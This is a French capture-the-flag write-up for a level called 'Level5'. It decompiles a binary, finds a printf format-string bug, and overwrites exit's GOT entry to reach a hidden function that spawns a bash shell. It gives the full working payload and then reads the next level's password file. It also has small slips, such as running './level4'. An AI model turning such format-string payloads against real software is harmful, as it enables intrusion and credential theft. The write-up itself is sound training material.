

# Level5

---
###### Étape 1 : -- Décompiler le programme --

En décompilant le programme avec Dogbolt ou Ghidra, on voit dans le programme trois fonctions N, O et Main.

On voit par la suite que dans la fonction N il y a la fonction __printf__ qui est appelé.

 - on utilisera cette fonction pour overflow le programme.

On voit aussi que dans cette fonction on a la fonction __fgets__ qui est proteger, qui viens récupérer 512 charactères dans l'entrée standard.

On voit que dans la fonction O on a un appel system pour executer un terminal bash.

sachant que la fonction O n'est jamais appeler dans le programme. Avec printf dans la fonction N on dois faire en sorte d'accéder a la fonction O.


###### Étape 2: -- Récuperation d'information --

En lancant le programe comme suit:
```bash
python -c 'print "AAAA" + " %p " * 5' | ./level4
```

on observe ce resultat: 
> AAAA 0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141  0x20702520

on voit que la chaine "_AAAA_" -> hex: "_0x41414141_" ce situe a la 4ème position.

depuis ___GDB___ on recupère l'addresse de ___O___ qui est ==0x080484a4==. on la transforme ensuite en décimale -> 134513828

On récupère ensuite la première addresse dans la fonction exit -> ==0x8049838==.

###### Étape 3: -- Execution --

On crée un one-liner python pour executer un payload pour un __ret to libc__ qui nous permetra d'accéder à la fonction ___O___.

Contruction du payload: 
> (python - c 'print "[exit_address]" + "%[134513828 - sizeof(exit_address)]c" + "%4$n"'; cat -) | ./binary

Payload final :

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"'; cat -) | ./level5
```

Dans le terminal on execute la commande suivante pour récupérer le password du level6:

```bash
cat /home/user/level6/.pass
```






